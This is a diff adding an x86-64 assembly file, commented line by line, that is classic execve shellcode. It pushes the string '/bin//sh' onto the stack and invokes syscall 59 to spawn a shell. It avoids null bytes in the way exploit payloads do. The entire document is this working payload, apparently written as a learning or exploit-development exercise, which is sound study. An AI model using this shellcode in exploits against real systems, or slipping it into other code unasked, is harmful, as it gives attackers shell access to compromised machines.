@@ -1,0 +1,35 @@
+section .text
+
+global _start
+
+_start:
+
+    ; Set rax to 0 using xor instruction
+    xor rax, rax
+
+    ; Add 0x3b (59 in decimal) to rax using add instruction
+    add rax, 0x3b
+
+    ; Set rdi to 0 using xor instruction
+    xor rdi, rdi
+
+    ; Push rdi onto the stack
+    push rdi
+
+    ; Move 0x68732f2f6e69622f to rdi using movabs instruction
+    movabs rdi, 0x68732f2f6e69622f
+
+    ; Push rdi onto the stack
+    push rdi
+
+    ; Load effective address of [rsp] into rdi using lea instruction
+    lea rdi, [rsp]
+
+    ; Set rsi to 0 using xor instruction
+    xor rsi, rsi
+
+    ; Set rdx to 0 using xor instruction
+    xor rdx, rdx
+
+    ; Trigger a system call using syscall instruction
+    syscall
